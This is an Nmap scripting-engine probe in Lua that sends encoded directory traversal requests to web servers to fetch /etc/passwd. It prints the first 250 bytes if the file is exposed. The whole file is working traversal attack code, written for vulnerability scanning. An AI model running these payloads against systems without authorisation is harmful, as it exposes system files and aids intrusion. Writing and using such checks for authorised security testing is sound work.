-- HTTP probe for /etc/passwd
-- 07/20/2007

-- Started with Thomas Buchanan's HTTPAuth.nse as a base
-- Applied some great suggestions from Brandon Enright, thanks a lot man!

id = "HTTP directory traversal passwd probe"

description = "Probe for /etc/passwd if server is susceptible to directory traversal"

author = "Kris Katterjohn <katterjohn@gmail.com>"

license = "Look at Nmap's COPYING"

categories = {"intrusive"}

require "shortport"

-- Check for a valid HTTP return code, and check
-- the supposed passwd file for validity
validate = function(response)
	local passwd
	local line
	local start, stop

	-- Hopefully checking for only 200 won't bite me in the ass, but
	-- it's the only one that makes sense and I haven't seen it fail
	if response:match("HTTP/1.[01] 200") then
		start, stop = response:find("\r\n\r\n")
		passwd = response:sub(stop + 1)
	else
		return
	end

	start, stop = passwd:find("[\r\n]")
	line = passwd:sub(1, stop)

	if line:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") then
		return passwd
	end

	return
end

-- Connects to host:port, send cmd, and returns the (hopefully valid) response
talk = function(host, port, cmd)
	local socket
	local response

	socket = nmap.new_socket()

	socket:connect(host.ip, port.number)

	socket:send(cmd)

	response = ""

	while true do
		local status, lines = socket:receive_lines(1)

		if not status then
			break
		end

		response = response .. lines
	end

	socket:close()

	return validate(response)
end

httpget = function(str)
	return "GET " .. str .. " HTTP/1.0\r\n\r\n"
end

hexify = function(str)
	local ret
	ret = str:gsub("%.", "%%2E")
	ret = ret:gsub("/", "%%2F")
	ret = ret:gsub("\\", "%%5C")
	return ret
end

-- Returns truncated passwd file and returned length
truncatePasswd = function(passwd)
	local len = 250
	return passwd:sub(1, len), len
end

output = function(passwd, dir)
	local trunc, len = truncatePasswd(passwd)
	local out = ""
	out = out .. "Found with \"" .. dir .. "\"\n"
	out = out .. "Printing first " .. len .. " bytes:\n"
	out = out .. trunc
	return out
end

portrule = shortport.port_or_service({80, 8080}, "http")

action = function(host, port)
	local cmd, response
	local dir

	dir = "//etc/passwd"
	cmd = httpget(hexify(dir))

	response = talk(host, port, cmd)

	if response then
		return output(response, dir)
	end

	dir = string.rep("../", 10) .. "etc/passwd"
	cmd = httpget(hexify(dir))

	response = talk(host, port, cmd)

	if response then
		return output(response, dir)
	end

	dir = "." .. string.rep("../", 10) .. "etc/passwd"
	cmd = httpget(hexify(dir))

	response = talk(host, port, cmd)

	if response then
		return output(response, dir)
	end

	dir = string.rep("..\\/", 10) .. "etc\\/passwd"
	cmd = httpget(hexify(dir))

	response = talk(host, port, cmd)

	if response then
		return output(response, dir)
	end

	dir = string.rep("..\\", 10) .. "etc\\passwd"
	cmd = httpget(hexify(dir))

	response = talk(host, port, cmd)

	if response then
		return output(response, dir)
	end

	return
end

